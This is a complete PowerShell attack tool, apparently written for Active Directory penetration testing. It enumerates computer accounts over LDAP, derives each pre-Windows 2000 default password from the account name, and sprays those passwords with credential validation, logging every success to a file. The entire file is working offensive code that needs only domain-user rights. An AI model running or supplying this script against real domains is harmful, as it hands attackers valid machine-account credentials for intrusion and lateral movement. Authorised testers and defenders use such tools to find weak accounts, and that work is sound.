<#
.SYNOPSIS
DomainHunter: Pre2k Password Discovery Tool
Version: 1.0
Author: Bruno Monteiro

.DESCRIPTION
Advanced tool for discovering and testing pre-Windows 2000 computer account passwords in Active Directory environments.
The tool performs password spraying against computer accounts using their pre-Windows 2000 naming convention.

.FEATURES
- Automated computer account enumeration
- Pre-Windows 2000 password testing
- Age-based password filtering (30+ days)
- Pre-Windows 2000 Compatible Access group targeting
- Real-time success/failure logging
- Progress tracking
- Detailed output file generation

.PARAMETERS
OutputPath
    - Path where results will be saved
    - Format: [TESTING] Computer: COMPUTERNAME$ Password: password SUCCESS/FAILED

FilterOld
    - Option to only test machines with passwords older than 30 days
    - Input: y/n

CheckGroup
    - Option to only test machines in Pre-Windows 2000 Compatible Access group
    - Input: y/n

.OUTPUTS
Console:
    - Real-time execution status
    - Success notifications in GREEN
    - Age information for qualifying machines in CYAN
    - Summary statistics

File:
    - Detailed test results
    - Success/Failure status for each attempt
    - Computer name and tested password

.NOTES
- Requires Domain User permissions
- Works in constrained language mode
- No local admin rights needed
#>

# User input configuration
$OutputPath = Read-Host "Enter the full path and filename for output (e.g. C:\temp\results.txt)"
New-Item -Path $OutputPath -ItemType File -Force | Out-Null
$FilterOld = Read-Host "Filter for machines with passwords older than 30 days? (y/n)"
$CheckGroup = Read-Host "Check Pre-Windows 2000 Compatible Access group members only? (y/n)"

# Domain connection setup using ADSI
$Root = New-Object DirectoryServices.DirectoryEntry
$DomainPath = "LDAP://" + $Root.distinguishedName
Write-Host "[+] DomainHunter starting..."
Write-Host "[+] Target Domain: $DomainPath"
Write-Host "[+] Results will be saved to: $OutputPath"

# LDAP search configuration
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.SearchRoot = $Root

# Configure search based on group membership if requested
if ($CheckGroup -eq 'y') {
    $GroupSearcher = New-Object DirectoryServices.DirectorySearcher
    $GroupSearcher.SearchRoot = $Root
    $GroupSearcher.Filter = "(&(objectClass=group)(objectSid=S-1-5-32-554))"
    $Group = $GroupSearcher.FindOne()

    if ($Group) {
        Write-Host "[+] Found Pre-Windows 2000 Compatible Access group" -ForegroundColor Green
        $Searcher.Filter = "(&(objectClass=computer)(memberOf=$($Group.Properties.distinguishedname)))"
        Write-Host "[+] Targeting only computers in Pre-Windows 2000 group" -ForegroundColor Yellow
        
        $Computers = $Searcher.FindAll()
        Write-Host "`n[+] Computers in group:" -ForegroundColor Cyan
        foreach($Computer in $Computers) {
            $PwdLastSet = $Computer.Properties["pwdlastset"][0]
            $PwdLastSetDate = [DateTime]::FromFileTime($PwdLastSet)
            $DaysOld = (New-TimeSpan -Start $PwdLastSetDate -End (Get-Date)).Days
            Write-Host "    - $($Computer.Properties["samaccountname"][0]) - Password Last Set $DaysOld days" -ForegroundColor Cyan
        }
    } else {
        Write-Host "[!] Pre-Windows 2000 Compatible Access group not found, targeting all computers" -ForegroundColor Red
        $Searcher.Filter = "(&(objectClass=computer)(pwdLastSet=*))"
        $Computers = $Searcher.FindAll()
    }
} else {
    $Searcher.Filter = "(&(objectClass=computer)(pwdLastSet=*))"
    $Computers = $Searcher.FindAll()
}

# Counter initialization
$SuccessCount = 0
$TotalCount = $Computers.Count

Write-Host "`n[+] Found $TotalCount computers to test" -ForegroundColor Yellow
Write-Host "[*] RUNNING... " -NoNewline -ForegroundColor Cyan

# Main processing loop
foreach($Computer in $Computers) {
    # Password age filtering logic
    if ($FilterOld -eq 'y') {
        try {
            $PwdLastSet = $Computer.Properties["pwdlastset"][0]
            $PwdLastSetDate = [DateTime]::FromFileTime($PwdLastSet)
            $DaysOld = (New-TimeSpan -Start $PwdLastSetDate -End (Get-Date)).Days
            
            # Skip if password is less than 30 days old
            if ($DaysOld -lt 30) {
                continue
            }
            Write-Host "`n[INFO] Found machine with $DaysOld days old password: $($Computer.Properties["samaccountname"][0])" -ForegroundColor Cyan
        }
        catch {
            continue
        }
    }

    # Password generation and testing
    $Name = $Computer.Properties["samaccountname"][0]
    $Password = $Name.ToLower()
    if ($Password.Length -gt 1) {
        # Generate pre-Windows 2000 style password
        $Password = $Password.Substring(0, $Password.Length - 1)
        if ($Password.Length -gt 14) {
            $Password = $Password.Substring(0,14)
        }
        
        # Authentication testing
        try {
            $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext("Domain")
            if ($Context.ValidateCredentials($Name, $Password)) {
                $Result = "[TESTING] Computer: $Name Password: $Password SUCCESS"
                Write-Host "`n$Result" -ForegroundColor Green
                Add-Content -Path $OutputPath -Value $Result
                $SuccessCount++
            } else {
                $Result = "[TESTING] Computer: $Name Password: $Password FAILED"
                Add-Content -Path $OutputPath -Value $Result
            }
        } catch {
            $Result = "[TESTING] Computer: $Name Password: $Password FAILED"
            Add-Content -Path $OutputPath -Value $Result
        }
    }
}

# Final summary output
Write-Host "`n[+] DomainHunter scan complete!" -ForegroundColor Yellow
Write-Host "[+] Found $SuccessCount successful authentications" -ForegroundColor Yellow
Write-Host "[+] Results saved to: $OutputPath" -ForegroundColor Yellow

